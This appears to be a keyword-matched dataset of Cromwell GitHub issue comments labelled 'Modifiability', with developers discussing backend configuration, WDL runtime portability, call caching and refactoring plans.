Modifiability,"I would love to see this folded into a general ""import resolver configurability"" feature. Right now the code is a bit of spaghetti for different conditions (e.g. local imports, zip imports, http). Would be great to have that all config driven. Also -- I wrote the http importer in such a way that we should be able to ""configure"" an http importer that provides headers/credentials for certain URLs. That could also be the driver to implement this. Happy to discuss more with faces",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2773#issuecomment-338747591:64,config,configurability,64,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2773#issuecomment-338747591,3,['config'],"['config', 'configurability', 'configure']"
Modifiability,"I'd argue that the arbitrary KV thing was one of the largest mistakes from Original WDL (i.e. what came out of the 2 weeks of us locking ourselves in a room and figuring it all out) as it destroys portability unless one adds *some* structure to it. We've doubled down on it over the years by adding what IMO should be Cromwell workflow options into the runtime block which means that a WDL can now have important control information on it which might ruin the portability of that workflow. The worst example I can think of is `backend` which is a purely Cromwell concept - what happens when that workflow goes to run on DNAnexus? What happens when `backend` is *also* a concept in another engine but it means something else? What happens when one engine interprets `cpu` to mean ""at least this much"" and another ""exactly this much""? What happens when in the former case the user gets charged more money than they thought because more memory than they needed was allocated? What happens when one engine assumes `mem` is just a number representing GB and can't parse a string w/ units?. (admittedly `mem` is a bad example as it's one of the very few things in `runtime` the spec is actually opinionated about, but you get the point). If the goal is to decouple Cromwell from WDL, the most obvious target is the `runtime` section. If people need more control over their Cromwell experience the answer is to a) provide that information in a way which doesn't destroy workflow portability of the WDL and b) expose that via Firecloud if those users need Firecloud. FWIW one of my primary goals for WDL 1.0 is a massive redo of `runtime` including removing the arbitrariness of it. If things are implementation specific they can be passed in to that engine separately, which would also help maintain the portability of the workflow itself.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2990#issuecomment-349459099:197,portab,portability,197,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2990#issuecomment-349459099,4,['portab'],['portability']
Modifiability,"I'd call this a ""medium"" effort for a developer. It's not a quick fix, while not as much as an effort as ""implement CWL"". A couple weeks of refactoring, a round of testing and team review, then another two weeks to polish it off.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1218#issuecomment-332394280:140,refactor,refactoring,140,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1218#issuecomment-332394280,1,['refactor'],['refactoring']
Modifiability,"I'd like to bump this, we are running into this issue with cromwell-41 (and I am about to check cromwell-46) that when we have a workflow failure, the failure message appears in the server logs but is never copied to the workflow log. . Eg., ; Workflow Log (empty):; > cat workflow.5a34cc05-9f9a-40a0-8691-2b0eb49cdbc3.log. Server Log:; > grep -A3 5a34cc05-9f9a-40a0-8691-2b0eb49cdbc3 cromwell-2019-09-17.7566.log; 2019-09-25 15:59:21,689 cromwell-system-akka.dispatchers.engine-dispatcher-26816 ERROR - WorkflowManagerActor Workflow 5a34cc05-9f9a-40a0-8691-2b0eb49cdbc3 failed (during MaterializingWorkflowDescriptorState): cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anon$1: Workflow input processing failed:; Invalid value for File input 'GermlineMasterWF.trimseq.TRIMSEQ_paired.Adapters': empty value; Invalid value for File input 'GermlineMasterWF.trimseq.TRIMSEQ_single.Adapters': empty value; 	at cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor.cromwell$engine$workflow$lifecycle$materialization$MaterializeWorkflowDescriptorActor$$workflowInitializationFailed(MaterializeWorkflowDescriptorActor.scala:215)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4310#issuecomment-535552697:825,Adapt,Adapters,825,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4310#issuecomment-535552697,2,['Adapt'],['Adapters']
Modifiability,I'd vote 👍 on using noop as the default out-of-the-box option so long as:; - it's documented as a config change; - we do something sensible in centaur; - we make sure the specs are still working as expected,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4632#issuecomment-462450314:98,config,config,98,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4632#issuecomment-462450314,1,['config'],['config']
Modifiability,"I'll largely defer to @cjllanwarne, @mcovarr, or @danbills on the specifics, but it seems that you could specify the runtime attribute you need and how to interpret it by customizing the SLURM backend in the config:. https://cromwell.readthedocs.io/en/stable/backends/SLURM/. If I'm reading the docs correctly, it might be possible to inject your `module load` command into the `--wrap` argument.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4997#issuecomment-505658382:208,config,config,208,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4997#issuecomment-505658382,1,['config'],['config']
Modifiability,"I'm a fan of this request. Perhaps something like ${workflowName.variableName} could be used within any task since it should be unique across the wdl file. In the initial example (just to be explicit), the usage could look like: ${indexes.genome}",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2504#issuecomment-391424743:65,variab,variableName,65,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2504#issuecomment-391424743,1,['variab'],['variableName']
Modifiability,"I'm also running into this. Would be nice to get some guidance on a fix from the cromwell team. Ideally, maybe both the user and volume mount location are configureable? Not sure yet what the best fix is.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/472#issuecomment-252058323:155,config,configureable,155,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/472#issuecomment-252058323,1,['config'],['configureable']
Modifiability,"I'm confused. Sandbox mode doesn't/shouldn't require sudo. We included it because it requires the *least* permissions to use it. . As for `pull`, it seems to force rebuild the image every time, exactly the same as `build --force`. What we want ideally is a way to build the image if it doesn't exist or needs to be updated, but if neither is the case, then do nothing.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4635#issuecomment-463866252:14,Sandbox,Sandbox,14,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4635#issuecomment-463866252,1,['Sandbox'],['Sandbox']
Modifiability,"I'm don't know how to exactly determine it was the issue, but when creating the [AMI Profile](https://console.aws.amazon.com/cloudformation/home?#/stacks/new?stackName=GenomicsWorkflow-AMI&templateURL=https://s3.amazonaws.com/aws-genomics-workflows/templates/create-genomics-ami/create-custom-ami-new-vpc.yaml), specifying `/cromwell_mount` is what made it work for me. Does this mean [the documentation](http://aws-genomics-workflows.s3-website-us-east-1.amazonaws.com/cromwell/cromwell-aws-batch/#custom-ami-with-cromwell-additions) is incorrect, or have I accidentally fixed my config in some other way?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4341#issuecomment-438853304:581,config,config,581,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4341#issuecomment-438853304,1,['config'],['config']
Modifiability,I'm gonna close this. There's no reason to disrupt this before we undergo the big-scary runtime-attributes-refactor,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1167#issuecomment-275786330:107,refactor,refactor,107,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1167#issuecomment-275786330,1,['refactor'],['refactor']
Modifiability,"I'm guessing that this isn't running a build of a recent version of develop?. We have not automated publishing of develop builds of cromwell, so can you build a jar from the latest source code using `sbt assembly`, and then try your config again? If that doesn't work, and there's no private information inside you config file, please post the backend stanza from the application.conf so that we may continue debugging your issue.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1406#issuecomment-246728088:233,config,config,233,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1406#issuecomment-246728088,2,['config'],['config']
Modifiability,"I'm having another look at this issue (hoping to resolve it before next week). One dilemma I have is that I would like to pull the disk spec format out from any individual backend, and make it a global pattern used by all backends. This would remove the possibility of making workflows compatible with one backend but not another. However this would be quite an opinionated change, and it might require some more serious approval. Should I refactor the entire disk spec, or just write a quick fix for the AWS backend?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4274#issuecomment-482011764:440,refactor,refactor,440,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4274#issuecomment-482011764,1,['refactor'],['refactor']
Modifiability,I'm having the same issue. I've used the CloudFormation template as is. Didn't make any changes in the Cromwell config.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4686#issuecomment-499598950:112,config,config,112,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4686#issuecomment-499598950,1,['config'],['config']
Modifiability,"I'm not a Cromwell dev, but I've dealt with this quite a lot, so I have some experience here... When resource issues happen on local-Cromwell, it is usually due to scattered tasks either [all running at once (which is the default behavior)](https://broadworkbench.atlassian.net/browse/CROM-6716), or, if they're running one-at-a-time, [things getting stuck](https://github.com/broadinstitute/cromwell/issues/6946). But none of your tasks are scattered, so the usual easy fixes don't apply. Unfortunately, Cromwell ignores most of your runtime arguments when running in ""local mode"" including memory, cpu, and disk size. This isn't something you can configure, it just doesn't know how to handle them. You'll see warnings to that effect when the tasks launch, eg:. ```; [2022-12-13 12:11:22,26] [warn] LocalExample [5aba40a5]: Key/s [preemptible, disks, cpu, memory] is/are not supported by backend. Unsupported attributes will not be part of job executions.; ```. One thing you can try doing to get around this is to make sure Docker is getting as much memory as you can give it. If you're using Docker Desktop, you can do this in Preferences > Resources, then cranking the memory slider as far to the right as you feel comfortable doing. But I do notice you're using a Linux machine, so it's probably a good idea to be using [Docker Engine](https://docs.docker.com/engine/install/) instead of Docker Desktop [if this this issue with the Dockstore CLI, which that uses Cromwell to launch workflows, is any indication](https://github.com/dockstore/dockstore/issues/5135), which has a different way of configuring resources. If you're still having issues, please post a followup -- and others, please chime in too if you have ideas. Resource usage on local runs is a bit of a persistent issue with Cromwell.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6966#issuecomment-1349647888:649,config,configure,649,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6966#issuecomment-1349647888,2,['config'],"['configure', 'configuring']"
Modifiability,"I'm not a big fan of copy/pasting the entire backend - not least because now all edit history in git from the original files is lost. Is it possible to bring in alpha vs beta as a config option to the backend and just switch which API gets called at the relevant points in the code?. eg; ```; backends {; PAPIv2alpha {; class="".../papiv2backend""; config {; api_version: ""alpha""; }; }; PAPIv2alpha {; class="".../papiv2backend""; config {; api_version: ""beta""; }; }; }; ```. Alternatively, could the `class="".../papiv2beta""` backend just be a really thin extension of the existing papiv2alpha backend, which just overrides the api which gets called during submission and status polling?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5386#issuecomment-580354869:180,config,config,180,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5386#issuecomment-580354869,3,['config'],['config']
Modifiability,"I'm not great / experienced with Cromwell, and to be honest I'm not sure what native support would mean. What I was trying is to just treat a singularity container like an executable, and add it as a Local backend, sort of like this --> https://github.com/vsoch/wgbs-pipeline/pull/1/files#diff-f6baca157827c4888c394eab694e000c. That works to run the analysis step (in a singularity container) just using singularity like any executable. I don't totally understand the job_id so there is a bug, but my colleague @bek is going to take a look! The container is run to produce the output, so that's a good start at least (and probably I'm missing something huge here). So to answer your question... in my wdl at least, I'm just using the same local commands. It looks the same as it would running any Local backend configuration.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-411571375:811,config,configuration,811,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-411571375,1,['config'],['configuration']
Modifiability,"I'm not sure I understand what you mean by ""putting globs in arguments is still not supported"" ?. In the meantime you can override what the glob command is using this field in your backend configuration: `glob-link-command`; For instance: `glob-link-command = ""ls -L GLOB_PATTERN 2> /dev/null | xargs -I ? ln -s ? GLOB_DIRECTORY""`. This is not well documented, I'll fix that.; (`GLOB_PATTERN` and `GLOB_DIRECTORY` are placeholders that will be replaced at runtime with the right values)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4395#issuecomment-439384644:189,config,configuration,189,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4395#issuecomment-439384644,1,['config'],['configuration']
Modifiability,"I'm not sure how miniwdl handles this, I'm just testing this one on Cromwell for now. But putting aside the spec, miniwdl, and Cromwell here, when I write some sort of code in any particular language, I always expect at least one of these to work:. * `if defined(variable) then do_something(variable)`; * `if type(variable) is not None then do_something(variable)` or its close cousin `if variable is not None then do_something(variable)`; * `if exists(file) then do_something(file)`. In Cromwell-flavored WDL (perhaps all WDL?), it doesn't seem you can do any of those. The first one will throw an ""Expected X but got X?"" error and the other two don't seem to have equivalents. Compare that to Python, where I can explicitly do the second or third one, and implicitly do the first one. In Python, if I try to do_something() on a variable that isn't defined, Python throws a Name Error, but in Cromwell!WDL trying to do_something() on an optional throws a ""Expected X but got X?"" error that doesn't tell you if X is actually defined or not. The fact that the WDL spec doesn't explicitly say that defined() can coerce a variable doesn't really matter -- I would wager that most people would expect this sort of thing to work. It seems to be a logical conclusion that if a file exists, you can do something to that file, without having to call a totally different function to create a new variable. I did check your workaround, but it throws the same error. So, my understanding is the only way to do this in Cromwell is this:. ```; String basename_tsv = basename(select_first([tsv_file_input, ""bogus fallback value""])); String arg_tsv = if(basename_tsv == ""bogus fallback value"") then """" else basename_tsv; ```. ...which just isn't intuitive. It shouldn't be so complicated to get the basename of an optional file. . Even less intuitive is the fact that if you separate out the select_first() part into a new variable, my workaround doesn't work anymore. ```; String maybe_tsv = select_first([tsv_file_",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1245893354:263,variab,variable,263,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1245893354,7,['variab'],['variable']
Modifiability,"I'm not sure whether the WdlGlobFile is better than an enhanced WdlFile(path, isGlob) type. Any thoughts?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/253#issuecomment-151295979:55,enhance,enhanced,55,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/253#issuecomment-151295979,1,['enhance'],['enhanced']
Modifiability,"I'm still slowly investigating, but it looks like the scale factor environment variable isn't `export`ed, thus isn't available to `sbt`. Been playing around with the println's in a433a7f20a74faf70a1ec851545f0e9ec6836ce4 ([jenkins](https://fc-jenkins.dsp-techops.broadinstitute.org/job/cromwell-test-runner/555/consoleFull)) and 7fc56d3b73ce537b47aaecc6bf9cd0f1c020646f ([jenkins](https://fc-jenkins.dsp-techops.broadinstitute.org/job/cromwell-test-runner/557/consoleFull)).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4261#issuecomment-430454596:79,variab,variable,79,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4261#issuecomment-430454596,1,['variab'],['variable']
Modifiability,"I'm totally fine with using an actor rather than a floating Future here, that should allow for better concurrency management. But the structure of the code prior to this PR was the lowest-cost refactoring of the Olde Worlde JES backend to the New World, while this PR addressed the issue raised in #1004 that there was effectively a duplication of `Retry.withRetry`. If somebody wants to ticket replacing all the usages of `Retry.withRetry` with an Actor-based approach and lobby for that to be prioritized that's great, but making changes that broad seemed like more work than had been called for in this ticket. Or you could just submit a PR as @geoffjentry suggests. 😄",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1010#issuecomment-226590779:193,refactor,refactoring,193,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1010#issuecomment-226590779,1,['refactor'],['refactoring']
Modifiability,"I'm writing up a documentation PR, but I realised that the ideal spot for it ([here](https://cromwell.readthedocs.io/en/develop/tutorials/HPCIntro/)) is targeted towards PBS/TORQUE. Are there any torque users here that might be able to test out a config for us before I submit my PR?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-462217551:247,config,config,247,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-462217551,1,['config'],['config']
Modifiability,I've been looking into a solution that uses [VPC SC settings](https://cloud.google.com/vpc-service-controls) to restrict bucket egress to specific locations. The gist of it is the owner of the docker image puts the container registry in a project that is within a VPC SC perimeter. The docker image owner will need to configure the perimeter such that only VMs from specific ipRanges can access the bucket/docker image. I've put the details and instructions in [this doc](https://docs.google.com/document/d/1SlmleVb9YOmOEwMOFLDzfPq4EX4Sq1WfTcA4gTnnYx0/edit?usp=sharing) that I've currently shared with the Broad.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-921150372:318,config,configure,318,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-921150372,1,['config'],['configure']
Modifiability,"I've been running into this a lot recently. My current workaround is to add a dummy variable so it will rerun the task, but sometimes I don't know that a task will have identical inputs until it actually runs, therefore making the whole workflow fail.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/781#issuecomment-248372180:84,variab,variable,84,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/781#issuecomment-248372180,1,['variab'],['variable']
Modifiability,"I've been seeing the configurable epilogue more as a ""hey user, here's a place for you to add stuff for your specific setup"" rather than ""you absolutely need your epilogue config to have this if you want your backend to work"", but maybe they're not that far apart after all.; I'd be ok with making it a ""required"" epilogue for cloud backends as long as we make it pretty clear in the changelog that it's required and that a config update is necessary. Also I'm not too worried that anyone has been relying on this anyway since it's a hack to support empty directories which hopefully is not wildly used.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3864#issuecomment-402756505:21,config,configurable,21,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3864#issuecomment-402756505,3,['config'],"['config', 'configurable']"
Modifiability,I've merged #3735 that only `chmod`s the tmpdir when running on Docker. If it turns out we need a more flexible solution we can revisit the suggestions here.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3721#issuecomment-395221774:103,flexible,flexible,103,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3721#issuecomment-395221774,1,['flexible'],['flexible']
Modifiability,"I've tested both WDLs [in the forum post](http://gatkforums.broadinstitute.org/gatk/discussion/8864/how-can-a-method-configuration-locate-a-file-generated-by-wdl-method-write-lines-array-file) on firecloud-dev, which is running Cromwell 27. Neither of them work. Reopening this issue, but there isn't anything for us over in FC to do here.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1906#issuecomment-307478031:117,config,configuration-locate-a-file-generated-by-wdl-method-write-lines-array-file,117,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1906#issuecomment-307478031,1,['config'],['configuration-locate-a-file-generated-by-wdl-method-write-lines-array-file']
Modifiability,"I've worked out what happened, but I don't know if I can resolve this next problem. . I had call-caching turned on for SFS, and this was MD5 hash was being calculated by Cromwell on the login node, however for 2x 100GB BAM files at each step this was (obviously in retrospect) a resource drain. This was only applicable to backends that use the Local Filesystem (GCS and S3 file systems probably use their blob / object id). If you come across this issue, you might have a couple of solutions:; - Turn off call-caching, might not matter to you.; - If you're not using containers, you might be able to get away with the [path+modtime caching strategy](https://cromwell.readthedocs.io/en/stable/Configuring/#local-filesystem-options), requires you to use the [`soft-link` copying strategy](https://cromwell.readthedocs.io/en/stable/backends/HPC/#shared-filesystem).; - If you **are** using containers, you're out of luck unfortunately.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4945#issuecomment-507482774:693,Config,Configuring,693,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4945#issuecomment-507482774,1,['Config'],['Configuring']
Modifiability,"IIRC you generally want to inherit your deps (and everything else) from the main build.sbt and only vary the things which are actually varying. . Which raises the point that we should be doing that instead of defining all new plugins, deps, etc in here",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/495#issuecomment-192387903:27,inherit,inherit,27,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/495#issuecomment-192387903,2,"['inherit', 'plugin']","['inherit', 'plugins']"
Modifiability,"IMO if we put any security recommendations in our README we should be very careful to disclaimer it. **Heavily**. Maybe with something along the lines of:. ```; Warning! ; - Only YOU are responsible for your own security! ; - Cromwell is NOT a security appliance! ; - What follows are ideas and starting points and not necessarily a secure system configuration in your situation""; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1653#issuecomment-259192538:347,config,configuration,347,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1653#issuecomment-259192538,1,['config'],['configuration']
Modifiability,"IMO this is an example where composition would be better than inheritance. If we just passed a general-purpose `KeyValueServiceActor` a `databaseLike: KeyValueDatabaseInterface` at construction time (for us, an SQL-backed database), this might look a lot nicer",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1254#issuecomment-237932020:62,inherit,inheritance,62,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1254#issuecomment-237932020,1,['inherit'],['inheritance']
Modifiability,"Idea for how to make this CI compatible; - Use apachebench Docker; - Serve HTTP imports from a Mock Server Docker, configured using its rest API",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4573#issuecomment-469451689:115,config,configured,115,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4573#issuecomment-469451689,1,['config'],['configured']
Modifiability,"If i run cromwell with `-Dworkflow-options.workflow-failure-mode=""ContinueWhilePossible""` it does not work. Also using `-Dconfig.file=application.conf` does not work. Only **workflow_failure_mode** option in JSON config works.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1005#issuecomment-245632780:213,config,config,213,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1005#issuecomment-245632780,1,['config'],['config']
Modifiability,"If it is intended that the `qsub` files also capture the `command` output, then I think the only 'bug' is the default configuration and docs.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3705#issuecomment-393106416:118,config,configuration,118,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3705#issuecomment-393106416,1,['config'],['configuration']
Modifiability,If it's a recurring issue whould it not make sense to have it configurable?; 1. Patch it on every cromwell release; 1. Hard-code a chmod reset in every WDL command,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3721#issuecomment-394406690:62,config,configurable,62,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3721#issuecomment-394406690,1,['config'],['configurable']
Modifiability,If it's the default it will be 2 seconds. I doubt it was changed in the config but @hjfbynara could confirm (`services.MetadataService.config.metadata-summary-refresh-interval` is the config path).; I don't think the summarization is related though because this is even before the events are written to the `METADATA_ENTRY` table. Unless the summarization somehow creates a lock on that table under some circumstances preventing writing of new events...,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4400#issuecomment-440695032:72,config,config,72,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4400#issuecomment-440695032,3,['config'],['config']
Modifiability,If the AWS backend uses ioActor this may already be covered in configuration?; ```; system {; io {; # Global Throttling - This is mostly useful for GCS and can be adjusted to match; # the quota availble on the GCS API; #number-of-requests = 100000; #per = 100 seconds. # Number of times an I/O operation should be attempted before giving up and failing it.; #number-of-attempts = 5; }; }; ```,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4303#issuecomment-436885778:63,config,configuration,63,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4303#issuecomment-436885778,1,['config'],['configuration']
Modifiability,"If the command is put into an env var, can the command run in the container be just $MYVAR ?. The process running Cromwell already needs read-only access to the bucket, to get the result code. And the config is already done by CloudFormation or script. I’d prefer one-time config to having to rewrite workflows.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4216#issuecomment-427597353:201,config,config,201,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4216#issuecomment-427597353,3,"['config', 'rewrite']","['config', 'rewrite']"
Modifiability,If this is ever implemented it should be `DEBUG` or a configurable option w/ a warning about the potential performance impact,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1368#issuecomment-269263625:54,config,configurable,54,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1368#issuecomment-269263625,1,['config'],['configurable']
Modifiability,"If you back Cromwell with a database (see [persisting data between restarts](https://cromwell.readthedocs.io/en/stable/tutorials/PersistentServer/)), you are able to stop Cromwell and restart without job information loss. After setting up this database, you can enable [call-caching](https://cromwell.readthedocs.io/en/stable/cromwell_features/CallCaching/) which if you modify your workflow, tools or inputs, will use previously computed results where:. - The command line used to generate the files is exactly the same; - The computed files still exist; - Other [call-caching configurations](https://cromwell.readthedocs.io/en/stable/wf_options/Overview/#call-caching-options) are valid. Alternatively, you could always stop your workflow, and modify it to run only from the point you've executed from with your already computed files. Straight forward, but could be a little tedious.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5300#issuecomment-558871640:578,config,configurations,578,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5300#issuecomment-558871640,1,['config'],['configurations']
Modifiability,"If you can find an example config that would be very helpful. It should be almost as simple as tweaking the `submit-docker` flag in the config to use `udocker`, no? . I have a feeling that `udocker` will be easier to use, and will be a better recommendation for Cromwell than directly using `singularity`, because it provides a very docker-like CLI that should make the switch fairly painless.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-454250398:27,config,config,27,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-454250398,2,['config'],['config']
Modifiability,"If you don't want to open the zip:. WDLTesting/src/wdl/Workflow.wdl:; ```; version development. import ""WDLTesting/src/wdl/WriteTask.wdl"" as Write. workflow TestingWF; {; 	call Write.WriteTask as Writer; 	{; 		input:; 			input1 = ""Foo""; }. }. ```; WDLTesting/src/wdl/WriteTask.wdl:; ```; version development. #################################################################################################; ## 				This WDL script writes its inputs to stdout				 ##; #################################################################################################. task WriteTask {. 	String	input1	# Variable with no default value; 	String	input2 = ""Default""; 	; 	command <<<; 		echo ""input1 = ${input1}""; 		echo ""input2 = ${input2}""; 	>>>; 	; output {; String	isDone = input2; }; }. ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6438#issuecomment-881119314:601,Variab,Variable,601,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6438#issuecomment-881119314,1,['Variab'],['Variable']
Modifiability,"Ignoring codecov because there are some ""in case they're useful"" implementations here that aren't activated without specific configuration and not going to be used in anything other than manual testing.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6047#issuecomment-736664007:125,config,configuration,125,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6047#issuecomment-736664007,1,['config'],['configuration']
Modifiability,Ignoring travis CI in this case. This IDE config file has no impact on production code.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6304#issuecomment-816861697:42,config,config,42,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6304#issuecomment-816861697,1,['config'],['config']
Modifiability,Implementer - please check out https://www.trivento.io/creating-settingsactor-configuration-properties-using-akka-extensions/,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/796#issuecomment-231463505:78,config,configuration-properties-using-akka-extensions,78,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/796#issuecomment-231463505,1,['config'],['configuration-properties-using-akka-extensions']
